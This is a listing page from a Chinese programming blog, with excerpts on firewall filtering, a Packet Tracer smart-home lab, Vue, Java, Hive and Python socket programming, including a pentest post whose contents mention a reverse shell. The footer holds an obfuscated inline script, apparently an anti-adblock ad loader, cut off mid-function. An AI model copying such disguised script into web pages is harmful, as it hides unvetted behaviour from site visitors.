不断升级，精准防护：入侵防御特征库会持续的更新，以保持最高水平的安全性。您可以从升级中心定期升级设备的特征库，以保持入侵防御的持续有效性。
3、URL过滤。 URL过滤与DNS过滤的关系： 黑白名单： 黑名单是不允许用户访问的URL列表，白名单是允许用户访问的URL列表。白名单的优先级高于黑名单的优先级。黑白名单一般用于过滤简单固定的网站。相对于URL分类，黑白名单的分类粒度更细。当用户请求访问URL时，设备将提取出的URL信息与黑白名单进行匹配。
4、DNS过滤。 DNS过滤功能是对DNS请求报文中的域名进行过滤，允许或禁止用户访问某些网站，规范上网行为。
5、内容过滤。 内容过滤是一种对通过FW的文件或应用的内容进行过滤的安全机制。
内容过滤包括文件内容过滤和应用内容过滤。
文件内容过滤是对用户上传和下载的文件内容中包含的关键字进行过滤。管理员可以控制对哪些应用传输的文件以及哪种类型的文件进行文件内容过滤。
应用内容过滤是对应用协议中包含的关键字进行过滤。针对不同应用，设备过滤的内容不同。
6、邮件过滤。 定义： 邮件过滤主要使用IP地址检查和邮件内容过滤技术，它可以帮助局域网用户提高邮件系统的安全性：
IP地址检查可以防止垃圾邮件在内网泛滥。
邮件内容过滤既可以过滤掉匿名邮件，也可以通过检查邮件内容控制内网用户的邮件发送或接收权限。
目的： 配置邮件地址组，可以减少垃圾邮件造成的带宽浪费，并防止邮件服务器因频繁转发垃圾邮件被上一级因特网服务提供商加入黑名单。
配置垃圾邮件防范-基于SMTP Server的IP地址，可以减少匿名邮件带来的信息干扰。
配置匿名邮件检测和配置邮箱地址检查可以从邮件的发送权限、发送规模进行控制，防止信息泄密。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4435cc611df252b3ce5f8ccc25f1a3c2/" rel="bookmark">
			Cisco Packet Tracer—智能家电实验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Cisco Packet Tracer—智能家电实验 实验背景 如今生活网络科技发达，万物互联已经成为必趋势，家庭用具物品互联已经发展成熟
完善和研究屋内物联。
智能家居放入基本目的就是将家用电器等连接到手机或者电脑上面，实现万物互联，改变了传统的生活方式。基于物联网的智能家居系统设计将物联网技术应用到现实生活中，改善了人们的生活方式，人们可以使用手机等装置实现远程控制，通过网络可以对家中进行整体的控制。整个系统包括了服务器、交换机、移动终端以及各种家用电器。
实验目的 了解并掌握物联网应用系统设计的步骤了解模拟器基本操作步骤 3. 基于模拟器设计并实现小型智能家居系统
实验技术 第一步：设计如何接入网络第二步：设计控制端第三步：设计总体架构
第四步：设备互联，可以通过wifi，也可以管理wifi
实验操作 打开Cisco Packet Tracer 配置服务器
点击左下角
点击sever选择sever将其放到屏幕上
选着Smartphone,将Smartphone放到桌面上
点击左下角第一行第一个选择,再点击第二行第二个.选着2960交换机
将其放到屏幕上
再点击第二行第四个选择无线设备
将其放到屏幕上
准备好服务器等设备
从第一排第二个,第二排第二个中选择不同的家电放到桌面上
点击右下角advanced按钮
选择上方菜单中的I/O Config选项
将其中的None设置为PT-IOT-NM-1CE
关闭吊扇,其他家电也同理
选着线路,开始连线
连线完成开始配置服务器
设置DHCP
IP地址设置为10.1.1.1
Dns设置为8.8.8.8
分配IP地址设置为10.1.1.0
子网掩码设置为255.255.255.0
用户设置为10个
点击save保存
DHCP设置完成.
点击IoT,将其设置为开启状态
点击on
开始设置IP地址
选择第一个开始配置IP地址
IP地址设置为10.1.1.1
子网掩码设置为255.255.255.0
设置完成
配置家电
选择吊扇1
点击DHCP,吊扇将自动获取IP地址
吊扇1IP地址配置完成,其它家电同理
选择智能手机
点击IoT Monitor
输入服务器的IP地址
点击确定
点击下方蓝色的sign up now
进行注册
账号设置为ahmin
密码设置为admin
关闭,然后打开服务器回到iot页面
发现我们的账号注册成功了
再次点开智能手机
选择IoT Monitor
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4435cc611df252b3ce5f8ccc25f1a3c2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/17a0bf85aa7978676abe697987553c43/" rel="bookmark">
			Element-ui中el-select选择器实现输入和搜索，可显示输入值的详细讲解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、问题 在使用el-select选择器中，遇到了如下问题
点击下方下拉框里面的值，才能进行值得显示，但是当你输入一个匹配不上的数据时，等这个in-put失去焦点时，就会把值清空，不会值的完成绑定。如下图
失去焦点后
二、解决问题的办法 参照官网解释
强制刷新即可赋值完成
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1ee6168caf615be8abfa3b157ca7154f/" rel="bookmark">
			git提交时会将target也提交
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 有时候大家在提交git时发现会将编译文件target也提交上去，这种情况有以下几种情况
情况1：项目没有设置.gitignore
情况2：设置了.gitignore但是依然会提交。
第一种：添加.gitignore，并在文件中添加需要忽略的东西。
第二种：需要先删除该文件的跟踪记录，然后再将其加入.gitignore文件中。可以通过以下命令完成该操作：
git rm --cached -r . git add . git commit -m "Fix .gitignore not working" 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a97c95ff4339ea6520528531e5549705/" rel="bookmark">
			Vuex使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		State 存储属性
import Vue from 'vue' import Vuex from 'vuex' Vue.use(Vuex) export default new Vuex.Store({ state: { str: '今天学vueX，这是store传过来的数据', num: 0, shoplistitems: [], sum: 0, all: true }, }) 调取、使用 第一种是mapState，一般写到计算属性里面
import { mapState } from "vuex"; computed:{ ...mapState() } 第二种是读取$store.state.xxx
methods:{ fun(){ console.log(this.$store.state.xxx) } } 需要注意的是，如果做了模块化处理，应该先读取模块再到对应模块的。
state: $store.state.module_name.xxx
Getter 对stste属性的计算、操作
import Vue from 'vue' import Vuex from 'vuex' Vue.use(Vuex) export default new Vuex.Store({ state: { shoplistitems: [], sum: 0, }, getters: { getSum(state) { state.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a97c95ff4339ea6520528531e5549705/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/400302e744ed2765d29d6d75d2251596/" rel="bookmark">
			Java 类内部接口
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		内部接口概述 java类内部可以定义接口，作用可以看作是对类功能的进一步补充，类里面包含两部分：一部分是自己的固定的，一部分是可以变化的，而这可变的部分就编程了一个接口。
另一个作用是避免命名冲突。
举例说明：
public class LoginService { public interface Iface { public LoginResult login(java.lang.String userId, java.lang.String password) throws org.apache.thrift.TException; public LoginResult logout() throws org.apache.thrift.TException; } } 内部接口使用 //实现LoginService类中的Iface接口 public class LoginServiceImpl extends LoginService implements LoginService.Iface { @Override public LoginResult login(String userId, String password) { //重载LoginService.Iface的login方法 return onAdmin(userId,password); } @Override public LoginResult logout(){ //重载LoginService.Iface的logout方法 xxxxxxxx } public LoginResult onAdmin(String userName,String password){ xxxxxx } } 内部接口拓展 除了内部接口，Java中也可以使用内部类，内部类和其他类的四大成员属性、方法、构造器、代码块共同构成类的五大成员。
内部类最大的特点就是：可以直接访问私有属性。并且可以体现类与类之间的包含关系。
class Outer { //外部类 private int n1 = 100; //属性 public Outer(int n1) { //构造器 this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/400302e744ed2765d29d6d75d2251596/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c232877790d09c5ba1220af09dd52c44/" rel="bookmark">
			Python渗透测试编程基础——Socket网络编程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、socket编程简介
二、UDP编程
1.介绍
2.UDP编程socket方法说明
3.UDP编程实例
（1）服务端UDP_Server程序
（2）客户端UDP_Clinet程序
三、TCP编程
1.介绍
2.TCP编程socket方法说明
3.TCP编程实例
（1）服务端程序TCP_server
（2）客户端服务端程序TCP_client
4.TCP编程扩展
5.Python其他 Internet 模块
四、反弹shell
(1)客户端（黑客）
（2）服务端（目标）
一、socket编程简介 Socket又称"套接字"，是计算机间进行网络通信的一套程序接口。
套接字：IP+端口
Socket通信是基于客户端/服务器结构（C/S），可隐藏复杂的TCP/IP协议族，只要遵循Socket的规定就可以进行网络程序开发，简单且开发效率高。
Python中的socket模块，提供了套接字编程的大部分功能。支持使用UDP和TCP协议进行网络通信。
二、UDP编程 1.介绍 UDP属于无连接协议，在向接收方发送信息时不需要建立连接，而是直接发送即可。
UDP的应用：域名系统；视频流；IP语音等。
UDP编程流程及常用的
socket模块方法如图所示。
2.UDP编程socket方法说明 ①socket.socket([family[, type[, proto]]]): 创建Socket对象
family
说明
socket.AF_ INET
IPv4协议
socket.AF_ INET6
IPv6协议
socket.AF_UNIX
只能够用于单一的Unix系统进程间通信
type
说明
socket.SOCK_STREAM
流式socket , for TCP
socket.SOCK_DGRAM
数据报式socket , for UDP
socket.SOCK_RAW
原始套接字，普通的套接字无法处理ICMP、IGMP等网络报文，而SOCK_RAW可以；其次，SOCK_RAW也可以处理特殊的IPv4报文；此外，利用原始套接字，可以通过IP_HDRINCL套接字选项由用户构造IP头。
socket.SOCK_SEQPACKET
可靠的连续数据包服务
proto
一般不填，默认为0
②bind(address):绑定地址
③sendto(string,address):发送数据把string发送给指定的address。其中address格式为(接收方IP地址，端口号)。address用元组表示（ip,port）
④recvfrom(bufsize[,flags]): 接收数据
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c232877790d09c5ba1220af09dd52c44/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/94d6cf00bd1a443dc348f6b17d6c0452/" rel="bookmark">
			ArrayList中放的是一个对象，如何同时根据对象中的三个字段对List进行排序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import java.util.ArrayList; import java.util.Collections; import java.util.Comparator; public class YourObject { private int field1; private String field2; private double field3; // 构造函数和其他代码 public int getField1() { return field1; } public String getField2() { return field2; } public double getField3() { return field3; } } public class Main { public static void main(String[] args) { // 创建包含对象的ArrayList ArrayList&lt;YourObject&gt; list = new ArrayList&lt;&gt;(); // 添加对象到ArrayList // 使用Comparator对ArrayList进行排序 Collections.sort(list, Comparator .comparingInt(YourObject::getField1) .thenComparing(YourObject::getField2) .thenComparingDouble(YourObject::getField3)); } } Comparator.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/94d6cf00bd1a443dc348f6b17d6c0452/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b745f734c5d9c10752bff03ec896f1bc/" rel="bookmark">
			记录一个npm link 404的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装本地插件调试,该插件未发布到私库
第一部正常操作,没有问题
cd 插件目录 npm link 第二步的时候
cd 开发项目目录 npm link 插件package名 提示报错
npm ERR! code E404 npm ERR! 404 Not Found - GET http://xxxx - Not found npm ERR! 404 npm ERR! 404 'xxxxx@latest' is not in the npm registry. 原因是因为我在2个不同的vscode的cmd里分别执行了创建link和link到package
总结:npm link 与npm link &lt;package&gt; 必须在一个bash里执行完毕
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/68035450a131662c104380e65c4493bc/" rel="bookmark">
			How to design a database storage model for the community version of the water information system
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 How to design a database storage model for the community version of the water information system 1、领域划分2、设计2.1、基础域2.1.1、概述2.1.2、E-R图2.1.3、SQL脚本 2.2、资产域2.2.1、概述2.2.2、E-R图2.2.3、SQL脚本 2.3、计费域2.3.1、概述2.3.2、E-R图2.3.3、SQL脚本 2.4、监测域2.4.1、概述2.4.2、E-R图2.4.3、SQL脚本 2.5、水权域2.5.1、概述2.5.2、E-R图2.5.3、SQL脚本 2.6、灌溉域2.6.1、概述2.6.2、E-R图2.6.3、SQL脚本 2.7、排涝域2.7.1、概述2.7.2、E-R图2.7.3、SQL脚本 2.8、账单域2.8.1、概述2.8.2、E-R图2.8.3、SQL脚本 2.9、工程域2.9.1、概述2.9.2、E-R图2.9.3、SQL脚本 1、领域划分 序号中文名称英文名称代号备注1基础域basea012资产域assertsa023计费域billinga024监测域monitora035水权域quotaa046灌溉域irrigationa057排涝域flooda068账单域expensea079工程域engineeringa0810水文域hydrologya0911气象域meteorologya10 2、设计 2.1、基础域 2.1.1、概述 2.1.2、E-R图 2.1.3、SQL脚本 2.2、资产域 2.2.1、概述 2.2.2、E-R图 2.2.3、SQL脚本 2.3、计费域 2.3.1、概述 2.3.2、E-R图 2.3.3、SQL脚本 2.4、监测域 2.4.1、概述 2.4.2、E-R图 2.4.3、SQL脚本 2.5、水权域 2.5.1、概述 2.5.2、E-R图 2.5.3、SQL脚本 2.6、灌溉域 2.6.1、概述 2.6.2、E-R图 2.6.3、SQL脚本 2.7、排涝域 2.7.1、概述 2.7.2、E-R图 2.7.3、SQL脚本 2.8、账单域 2.8.1、概述 2.8.2、E-R图 2.8.3、SQL脚本 2.9、工程域 2.9.1、概述 2.9.2、E-R图 2.9.3、SQL脚本 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2e128a721cc7aa9b1b28496bc137ec2/" rel="bookmark">
			hive3从入门到精通
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		查询hive 架构 准备 HDFS配置 vim $HADOOP_HOME/etc/hadoop/core-site.xml &lt;!--配置所有节点的root用户都可作为代理用户--&gt; &lt;property&gt; &lt;name&gt;hadoop.proxyuser.root.hosts&lt;/name&gt; &lt;value&gt;*&lt;/value&gt; &lt;/property&gt; &lt;!--配置root用户能够代理的用户组为任意组--&gt; &lt;property&gt; &lt;name&gt;hadoop.proxyuser.root.groups&lt;/name&gt; &lt;value&gt;*&lt;/value&gt; &lt;/property&gt; &lt;!--配置root用户能够代理的用户为任意用户--&gt; &lt;property&gt; &lt;name&gt;hadoop.proxyuser.root.users&lt;/name&gt; &lt;value&gt;*&lt;/value&gt; &lt;/property&gt; 启动Hadoop # 启动hadoop start-all.sh # 检查hadoop进程 jps # 检查各端口 netstat -aplnt | grep java 检查MySQL是否启动成功 ps -aux | grep mysql netstat -aplnt | grep 3306 安装hive # 将软件上传到 /opt/soft 目录 # 解压hive tar -zxvf apache-hive-3.1.3-bin.tar.gz # 目录改名 mv apache-hive-3.1.3-bin hive-3 # 进入配置文件目录 cd /opt/soft/hive-3/conf # 复制配置文件 cp hive-env.sh.template hive-env.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d2e128a721cc7aa9b1b28496bc137ec2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f2fc3994db0af61a8221dcd6ff855c13/" rel="bookmark">
			node16.17.0安装教程(win)支持其他版本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		发现最新版的node有些项目不支持
然后整理了一些老的稳定的版本下载步骤
废话不多说看步骤
打开node官网
下载安装:这里选择全部安装包
默认显示的最新版本
路径后边更改需要的版本,比如说v16.17.0
下载安装程序,当然 下载压缩包也行
双击安装程序
安装步骤截图 检查是否安装成功 输入命令 node -v
查看当前镜像,默认是官方镜像(很慢建议换成国内的镜像)
更改镜像的步骤--&gt; npm 淘宝||华为-镜像的安装（2023最新版） - 掘金
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f2870242a131b56a0100393e5e352afd/" rel="bookmark">
			vue3按需引入 vite-plugin-style-import 2.0版本报错（解决办法）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		报错配置()：报错信息解决方法配置 报错配置()： //vite.config.js 部分代码 // 按需自动引入 elementplus 相关样式文件 import styleImport from 'vite-plugin-style-import' // https://vitejs.dev/config/ export default defineConfig({ plugins: [ vue(), styleImport({ libs:[{ libraryName:'element-plus', esModule:true, ensureStyleFile:true, resolveStyle:(name)=&gt;{ return `element-plus/lib/theme-chalk/${name}.css` }, resolveComponent:(name)=&gt;{ return `element-plus/lib/${name}`; } }] }) ], }) 报错信息 这是因为2.0版本之后，取消了styleImport
解决方法配置 // 按需自动引入 elementplus 相关样式文件 import { createStyleImportPlugin, ElementPlusResolve } from 'vite-plugin-style-import' // https://vitejs.dev/config/ export default defineConfig({ plugins: [ vue(), createStyleImportPlugin({ resolves: [ElementPlusResolve()], libs: [ { libraryName: 'element-plus', esModule: true, resolveStyle: (name) =&gt; { return `element-plus/theme-chalk/${name}.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f2870242a131b56a0100393e5e352afd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3705ad3ff1a1cda5133d5a1a0f948470/" rel="bookmark">
			在Python中调用imageJ开发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、在ImageJ中进行Python开发二、在Python中调用imageJ开发2.1、简介2.2、环境配置2.3、测试一2.4、测试二 Python + imageJ 解决方案，采坑记录
一、在ImageJ中进行Python开发 原生ImageJ仅支持JS脚本（JAVAScript），而ImageJ的衍生版本Fiji支持Python脚本编程，所以这里的ImageJ实际是Fiji。
第一步：Fiji官网下载（免费）：https://fiji.sc/第二步：安装Fiji第三步：打开Fiji第四步：ImageJ的Python脚本编程 二、在Python中调用imageJ开发 2.1、简介 PyImageJ：ImageJ2 的 Python 包装器。
功能：提供了一组包装函数用于ImageJ2 和 Python 之间的集成。它还支持原始的ImageJ API 和数据结构。优点：将 ImageJ 和 ImageJ2 与 Python 软件生态系统中提供的其他工具结合起来，包括 NumPy、SciPy、scikit-image、CellProfiler、OpenCV、ITK等等。 2.2、环境配置 安装
PyImageJ: Python wrapper for ImageJ2
步骤1：pip install imagej
步骤2：pip install pyimagej
步骤3：pip install Maven（暂时不需要） Java环境配置 BUG提示：JVMNotFoundException: No JVM shared library file (jvm.dll) found.
BUG翻译：在系统中找不到Java虚拟机 (JVM) 的共享库文件。
解决方案：设置JAVA_HOME环境变量，该变量指向Java安装目录。
（1）在Windows上安装Java： Oracle JDK 下载页面，选择并下载适用于电脑的JDK版本。运行安装程序，并按照提示完成安装。（2）设置环境变量：JDK8.0 环境变量的配置教程（3）重新启动Python环境：设置环境变量之后，重新启动你的 Python 环境，以确保更改生效。（4）检查 Java 安装版本与安装路径： 在终端或命令提示符中运行java -version在终端或命令提示符中运行echo %JAVA_HOME% 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3705ad3ff1a1cda5133d5a1a0f948470/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3e957f20c638efb99fdc78d52b937ef0/" rel="bookmark">
			计算机网络期末复习（知识点）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、计算机网络体系结构 计算机网络&amp;因特网： 计算机网络定义：将地理位置不同的具有独立功能的多台计算机及其外部设备，通过通信线路连接起来，在网络操作系统，网络关联软件及网络协议的管理和协调下，实现资源共享和信息传递的计算机系统
计算机网络组成：资源子网和通信子网 互联：计算机网络之间可以通过有线或无线的方式进行数据通信
自治：每一个独立的计算机有着自己的软件和硬件，可以单独运行
集合：至少需要两台计算机 因特网：一种特殊的计算机网络，其定义可以从具体构成描述和服务描述两个方面叙述。
具体构成描述：因特网是一种世界范围的计算机网络，即一个互联了遍及全世界的数亿计算设备的网络。
服务描述：为应用程序提供服务的基础设施
计算机网络体系结构 OSI参考模型 TCP/IP参考模型 数据传输方式 单工
只能单方向传输工作模式
双工
在同一时间，线路上只能允许一个方向的数据通过
全双工
双方都可以同时进行数据通信
按照传输对象（方式）分类 单播（1对1），多播（1对n），广播（1对all）
三种数据交换方式 路由器是实现分组交换的关键结构，其任务是转发收到的分组，这是网络核心部分最重要的功能。
传统两两相连范式：指每个设备都与其他设备直接相连，形成一个点对点的连接。这种方式通常用于小型网络或直接连接两个设备的情况。每个连接都需要独占的物理链路，因此成本较高。常见的两两相连的网络包括以太网。
电路交换 在通信开始之前，建立一条完整的通信路径（电路），并且在整个通信过程中保持该电路不变。这种方式适用于实时数据传输，如电话通信。在建立电路期间，资源被保留并独占使用，因此效率较低。常见的电路交换网络包括传统的电话网络。
分组交换 将数据分割成较小的数据包，通过网络独立传输，并在目标设备上重新组装成完整的数据。分组交换将数据包按需传输，通过共享网络资源提高了传输效率。常见的分组交换网络包括互联网。
发送过程
发送方
构造分组
发送分组
路由器
缓存分组
转发分组
简称为“分组转发”
路由器处理报文的过程
把收到的分组翻入缓存
查找转发表找出到某个目的地地址应该从哪个端口转发
把分组送到适当的端口转发出去
接收方
接收分组
还原报文 分组交换中的时延、丢包和吞吐量 时延：时延是数据从发送端到接收端所经历的时间。在分组交换网络中，时延可以分为以下几种类型：
传输时延：数据在传输介质上传输所需要的时间，取决于数据的长度和传输速率。传播时延：数据在传输介质上传播所需要的时间，取决于传输介质的物理特性，如传播速度。处理时延：数据在网络节点进行处理所需要的时间，包括路由决策、转发等操作。排队时延：数据在网络节点的队列中等待处理所需要的时间，取决于网络节点的负载情况。总时延： 丢包：丢包是指在传输过程中数据包丢失或损坏的现象。丢包可以由多种因素引起，如网络拥塞、传输错误、路由错误等。丢包会导致数据传输的错误和重传，从而降低网络的性能和吞吐量。
排队时延引起的丢包：1.缓冲区满导致的丢包 2.排队时间过长导致的丢包 3.拥塞控制导致的丢包 4.时延敏感应用丢包
端到端时延（不考虑拥塞）：
吞吐量：吞吐量是指网络在单位时间内能够传输的数据量。在分组交换网络中，吞吐量受到多个因素的影响，包括网络带宽、传输速率、丢包率等。吞吐量是衡量网络性能的重要指标，高吞吐量表示网络能够高效地传输数据。
报文交换 报文交换中的交换节点也采用存储转发的方式，对报文的大小没有限制，这要求结点交换机有较大的缓存空间。
对比 网络协议（protocol） 协议（protocol）：定义了在两个或多个通信实体之间交换报文的格式和顺序，以及报文发送、接收或其他实现所采取的操作
三要素：语法、语义、同步（时序）
语法：用户数据与控制信息的结构格式
语义：需要发出的控制信息，以及完成的动作和做出的响应
同步（时序）：实践实现顺序的详细说明
网络边缘&amp;网络核心 端系统（主机host）：与英特网相连的计算机和其他设备。分为客户（client）和服务器（server）
网络核心：提供信息交换的网络节点和通信线路 网络边缘&amp;网络核心的区别
位置：
网络边缘指离终端用户最近的网络基础设施，如WiFi接入点、基站等。它们位于网络的外围。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3e957f20c638efb99fdc78d52b937ef0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4cbb6e3908140cbdf9382201b7228dfb/" rel="bookmark">
			三菱FX3U与三菱变频器 modbus RTU通讯案例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		三菱FX3U与三菱变频器 modbus RTU通讯案例
器件：三菱FX3U PLC+FX3U 485BD，三菱E740变频器，昆仑通态触摸屏，威纶通
功能：采用485方式，modbus RTU协议。
与变频器通讯，控制启停，频率，加减速时间设定，频率，电流电压的读取。
说明：是程序非实物，包括有注释的程序，触摸屏程序（可以是昆仑通态和威纶通触摸屏）。
在工业自动化领域，PLC（可编程逻辑控制器）作为一个重要的控制装置，通常与其他设备进行通信以实现更加复杂的控制任务。在这样的场景下，PLC与变频器之间的通讯是常见的需求之一。本文将围绕着三菱FX3U PLC和三菱变频器modbus RTU通讯案例展开，探讨在该场景下的具体实现方法与技术细节。
一、硬件环境
在本案例中，我们使用了三菱FX3U PLC、FX3U 485BD模块、三菱E740变频器以及昆仑通态触摸屏或者威纶通触摸屏作为人机界面。这些设备之间通过485方式进行连接，使用modbus RTU协议进行通信。
二、软件开发
在软件开发方面，我们可以使用GX Works2作为PLC程序开发软件，使用三菱的FX3U 485BD模块实现485通讯。对于变频器的操作，我们可以通过读写modbus寄存器来实现。具体来说，我们需要针对不同的操作，读取或写入变频器的不同寄存器。
例如，如果我们想要进行启停控制，我们需要修改变频器的控制字寄存器。具体来说，我们可以通过写入00H或01H来实现启动或停止。如果我们想要控制变频器的频率，我们需要修改变频器的设置频率寄存器。如果我们想要读取变频器的电流或电压，我们需要读取对应的电流或电压寄存器。需要注意的是，读写寄存器时需要使用正确的地址和数据类型，这通常需要参考设备手册。
对于人机界面部分，我们可以使用昆仑通态触摸屏或威纶通触摸屏，并通过modbus通讯实现与PLC的数据交互。通过合理的界面设计，我们可以实现对变频器的各种控制操作，以及对电流和电压等参数的实时显示。
三、案例演示
在具体实现中，我们可以使用注释清晰、易于理解的PLC程序，并结合昆仑通态触摸屏或威纶通触摸屏的操作界面，实现对三菱E740变频器的多种不同操作。例如，我们可以通过昆仑通态触摸屏的按键，实现对变频器的启停控制和频率设定，同时实时显示电流和电压等参数。
总之，在工业自动化场景中，PLC与变频器的通讯是一项非常重要的技术，它可以实现对各种工业设备的高效控制和监测。通过本文所述的三菱FX3U与三菱变频器modbus RTU通讯案例，我们可以更好地理解和应用相关技术，并为工业控制领域的进一步发展做出贡献。
相关代码,程序地址：http://lanzouw.top/607580379245.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2e4e44f9a7a06284e88481872dc74600/" rel="bookmark">
			删除 word 中嵌入文字下方的图片
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题：Word中插入图片，选择图片格式【衬于文字下方】后，无法选择图片并删除。 解决方法： 如图所示，选择 【开始】-【编辑】-【选择】-【选择对象】，然后鼠标放在图片位置即可选中图片进行删除操作。
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/57/">«</a>
	<span class="pagination__item pagination__item--current">58/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/59/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new 